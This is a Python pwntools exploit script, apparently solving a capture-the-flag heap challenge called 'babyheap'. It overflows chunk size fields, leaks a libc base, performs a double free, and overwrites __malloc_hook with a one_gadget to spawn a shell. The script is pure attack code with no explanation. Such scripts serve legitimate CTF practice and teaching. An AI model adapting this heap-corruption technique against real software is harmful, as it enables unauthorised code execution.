#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')    

def cmd(x):
    r.recvuntil('Command: ')
    r.sendline(str(x))

def allocate(l):
    cmd(1)
    r.recvuntil('Size: ')
    r.sendline(str(l))

def fill(i,s,d):
    cmd(2)
    r.recvuntil('Index: ')
    r.sendline(str(i))
    r.recvuntil('Size: ')
    r.sendline(str(s))
    r.recvuntil('Content: ')
    r.send(d)

def free(i):
    cmd(3)
    r.recvuntil('Index: ')
    r.sendline(str(i))

def dump(i):
    cmd(4)
    r.recvuntil('Index: ')
    r.sendline(str(i))

for i in range(7):
    allocate(0x48) # 0
    allocate(0x48) # 1
    allocate(0x48) # 2
    allocate(0x48) # 3

    fill(0, 0x49, '\x00'*0x48 + '\xf1')
    fill(3, 0x30, 'a'*0x20 + p64(0xf0) + p64(0x501))
    free(1)
    free(0)
    free(2)
    free(3)


allocate(0x58) # 0
allocate(0x58) # 1
allocate(0x58) # 2
allocate(0x58) # 3

fill(0, 0x59, '\x00'*0x58 + '\xf1')
fill(3, 0x30, 'a'*0x20 + p64(0xf0) + p64(0x31))
free(1)
allocate(0x58) # 1
allocate(0x58) # 4

dump(3)
r.recvuntil('Chunk[3]: ')
libc_base = u64(r.recv(8)) - 0x3ebca0
print '[+] libc_base : ',hex(libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook'] # 0x35
realloc = libc_base + libc.symbols['__libc_realloc']
print '[+] malloc_hook : ',hex(malloc_hook)
print '[+] realloc : ', hex(realloc)
one_gadget = libc_base + 0x10a38c 

allocate(0x28) # 5,3 overlapping

fill(2, 0x59,'\x00'*0x58 + '\x51')
fill(3, 0x50, 'a'*0x40 + p64(0x50) + p64(0x31))

allocate(0x48) # 6

for i in range(7):
    allocate(0x58)
    free(7)

allocate(0x58)
free(7)

free(3) # double free
free(6)
free(5)

allocate(0x48) # 3
fill(3, 0x8, p64(malloc_hook + 0x3d))
allocate(0x48) # 5
allocate(0x48) # 6
allocate(0x48) # 7, random access

fill(7, 0x23 + 8, 'a'*0x23 + p64(malloc_hook - 0x18)) # hook top_chunk
allocate(0x30) # 8
fill(8, 0x10, p64(one_gadget) + p64(realloc + 0xa))

cmd(1)
r.recvuntil('Size: ')
r.sendline('48')

r.interactive()
